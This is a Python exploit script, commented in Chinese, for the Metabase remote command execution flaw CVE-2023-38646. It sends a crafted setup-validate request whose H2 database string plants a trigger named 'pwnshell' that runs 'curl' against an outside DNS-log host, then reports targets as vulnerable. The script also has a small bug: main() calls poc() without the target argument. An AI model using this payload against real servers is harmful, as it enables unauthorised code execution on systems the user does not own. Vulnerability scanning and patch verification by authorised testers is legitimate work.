#导包
import requests,sys,argparse,json
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
 ____  _____ _      ____  _____  _____   ____  ____  _      _      ____  _      ____    ________  _ _____ ____  _     _____  _  ____  _     
/  __\/  __// \__/|/  _ \/__ __\/  __/  /   _\/  _ \/ \__/|/ \__/|/  _ \/ \  /|/  _ \  /  __/\  \///  __//   _\/ \ /\/__ __\/ \/  _ \/ \  /|
|  \/||  \  | |\/||| / \|  / \  |  \    |  /  | / \|| |\/||| |\/||| / \|| |\ ||| | \|  |  \   \  / |  \  |  /  | | ||  / \  | || / \|| |\ ||
|    /|  /_ | |  ||| \_/|  | |  |  /_   |  \__| \_/|| |  ||| |  ||| |-||| | \||| |_/|  |  /_  /  \ |  /_ |  \_ | \_/|  | |  | || \_/|| | \||
\_/\_\\____\\_/  \|\____/  \_/  \____\  \____/\____/\_/  \|\_/  \|\_/ \|\_/  \|\____/  \____\/__/\\\____\\____/\____/  \_/  \_/\____/\_/  \|
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            



"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='Metabase validate 远程命令执行漏洞CVE-2023-38646')
    parser.add_argument('-url','--url',dest='url',type=str,help='input your url')
    args = parser.parse_args()
    if args.url:
        poc()
    else:
        print(f'Usage:\n\t python3 {sys.argv[0]}-h')
    


#poc函数
def poc(target):
    payload = '/api/setup/validate'
    headers = {
        'Content-Length': '416',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0',
        'Connection': 'close',
    }
    data = {"token":"d66c72f1-ddf7-4d55-aaff-53ffbd4fbb7b",
            "details":{
        "is_on_demand": 'false',
        "is_full_sync": 'false',
        "is_sample": 'false',
        "cache_ttl": 'null',
        "refingerprint": 'false',
        "auto_run_queries": 'true',
        "schedules":'{}',
        "details":{
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\n$$--=x",
            "advanced-options": 'false',
            "ssl": 'true',},
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
    res = requests.post(url=target + payload,headers=headers,json= data,verify=False)
    if res.status_code == 200:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')

#函数入口
if __name__ =='__main__':
    main()

